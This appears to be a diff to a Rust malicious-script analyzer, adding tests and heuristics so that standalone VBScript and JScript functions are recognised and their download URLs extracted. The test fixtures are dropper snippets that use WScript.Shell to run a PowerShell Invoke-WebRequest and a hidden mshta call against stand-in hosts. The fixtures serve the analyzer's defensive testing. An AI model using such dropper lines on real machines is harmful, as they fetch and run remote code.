@@ -909,6 +909,25 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
     }
 
     #[test]
+    fn standalone_script_prescan_ignores_direct_js_function_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"function main() {
+var sh = new ActiveXObject("WScript.Shell");
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js-function.example/p");
+}
+main();"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript function was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
@@ -2894,6 +2913,8 @@ fn looks_like_vbs_script(lower: &str) -> bool {
         || lower.starts_with("private sub ")
         || lower.contains("\npublic function ")
         || lower.starts_with("public function ")
+        || (lower.contains("\nfunction ") || lower.starts_with("function "))
+            && lower.contains("end function")
 }
 
 fn looks_like_js_script(lower: &str) -> bool {
@@ -2932,6 +2953,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || first.starts_with("public sub ")
         || first.starts_with("private sub ")
         || first.starts_with("public function ")
+        || (first.starts_with("function ") && lower.contains("end function"))
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
@@ -14267,6 +14289,32 @@ Main"#;
         );
         assert!(
             report.deobfuscated.contains("Public Sub Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_function_prefix_shell_run_url_extracted() {
+        let vbs = br#"Function Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-function.example/payload.hta", 0, False
+End Function
+Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-function.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Function prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Function Main()\nSet sh"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
